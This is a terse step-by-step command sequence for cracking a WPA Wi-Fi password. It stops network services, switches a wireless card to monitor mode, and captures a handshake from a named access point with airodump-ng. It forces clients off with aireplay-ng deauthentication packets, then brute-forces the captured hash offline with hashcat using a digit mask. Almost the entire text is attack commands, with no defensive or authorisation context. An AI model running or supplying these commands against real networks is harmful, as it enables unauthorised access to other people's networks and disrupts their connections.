#1. Stop the network manager and wireless supplicant:

sudo /etc/init.d/network-manager stop
ps aux | grep wpa_supplicant
sudo kill -9 <PID>
#2. Switch the wireless interface in monitor modesudo airmon-ng

sudo ifconfig wlx801f02b999b3 down
sudo iwconfig wlx801f02b999b3 mode monitor
sudo ifconfig wlx801f02b999b3 up
#3. Inspect the air in order to find the channel and MAC related to the chosen SSID:sudo airodump-ng wlx801f02b999b3

#4. Listen to the air, until WPA handshake will be captured:

sudo airodump-ng -c6 --bssid C4:0B:CB:86:D9:9E -w test wlx801f02b999b3

#5. If needed - send deauthentication packet in order to initiate re-authentication.

sudo aireplay-ng -0 2 -a C4:0B:CB:86:D9:9E wlx801f02b999b3

#6. Brute-force the password offline, using the hash received from the handshake:

~/hashcat-utils/src/cap2hccapx.bin test-01.cap hackme.hccapx
time hashcat -m 2500 hackme.hccapx -a 3 -w 3 '?d?d?d?d?d?d?d?d'
